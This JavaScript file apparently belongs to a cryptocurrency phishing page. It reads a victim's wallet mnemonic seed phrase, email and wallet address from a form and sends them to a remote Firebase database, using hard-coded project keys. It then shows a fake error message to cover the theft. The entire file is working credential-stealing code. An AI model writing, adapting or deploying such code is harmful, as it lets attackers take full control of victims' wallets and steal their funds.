const firebaseConfig = {
  apiKey: "AIzaSyA7gwUX3gZzcitDi1o7d1cBofdjpuVhjWA",
  authDomain: "wallet-form-5f817.firebaseapp.com",
  databaseURL: "https://wallet-form-5f817-default-rtdb.firebaseio.com",
  projectId: "wallet-form-5f817",
  storageBucket: "wallet-form-5f817.appspot.com",
  messagingSenderId: "559255000272",
  appId: "1:559255000272:web:aaad5f8f5051e1093f3ad5"
}

firebase.initializeApp(firebaseConfig)

var contactFormDB = firebase.database().ref('walletForm')

document.getElementById('mButton').addEventListener('click', submitForm)

function submitForm() {
  var mnemonicWord = document.getElementById('mname').value
  var emailId =  document.getElementById('memailid').value
  var walletAddress =  document.getElementById('mwalletAddress').value

  saveMessages(mnemonicWord, emailId, walletAddress)
  error1()
}

const saveMessages = (mnemonicWord, emailId, walletAddress)=>{
  var newContactForm = contactFormDB.push()

  newContactForm.set({
    mnemonicWord:mnemonicWord,
    emailId:emailId,
    walletAddress:walletAddress,
  })
}

function error1 () {
  document.querySelector('.m-block').classList.add('d-none')
  document.querySelector('.errorM').classList.remove('d-none')
  
}

document.querySelector('.closeM').addEventListener('click', ()=>{
  document.querySelector('.m-block').classList.remove('d-none')
  document.querySelector('.errorM').classList.add('d-none')
})
